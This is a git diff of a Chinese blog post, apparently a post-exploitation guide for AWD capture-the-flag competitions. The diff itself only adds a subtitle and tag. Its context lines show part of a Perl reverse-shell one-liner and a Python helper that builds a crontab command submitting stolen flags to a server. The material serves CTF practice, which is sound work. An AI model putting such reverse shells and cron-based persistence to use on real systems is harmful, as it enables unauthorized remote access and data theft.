@@ -2,6 +2,7 @@
 layout: post
 category: CTF
 title: Web选手的AWD后渗透指南
+subtitle: CTF线下赛备忘
 catalog: true
 excerpt: 翻了下网上的AWD资料，发现大家都没有详细讲细节，AWD的资料还是不够开放与完善。在此，放一些个人对AWD运维和后渗透相关的总结。AWD比赛还是很好玩，希望大家从中学到知识的同时享受到对抗的快感。
 time: 2018.08.21 14:35:00
@@ -9,6 +10,7 @@ tags:
 - CTF
 - AWD
 - backdoor
+- 线下赛
 
 
 ---
@@ -104,7 +106,6 @@ tags:
    www-data@9b275645e178:/var/www/html/Myself $
    ```
 
-   
 
 ## 2. 蚁剑及菜刀型后门
 
@@ -233,8 +234,6 @@ perl -e 'use Socket;$i="127.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getproto
   cmd = crontab_flag_submit(flag_server='172.16.132.2',flag_port='8088',flag_url='submit',flag_token='bcbe3365e6ac95ea2c0343a2395834dd',flag_path='/flag')
   print(cmd)
   ```
-
-  
 
 - ...
 
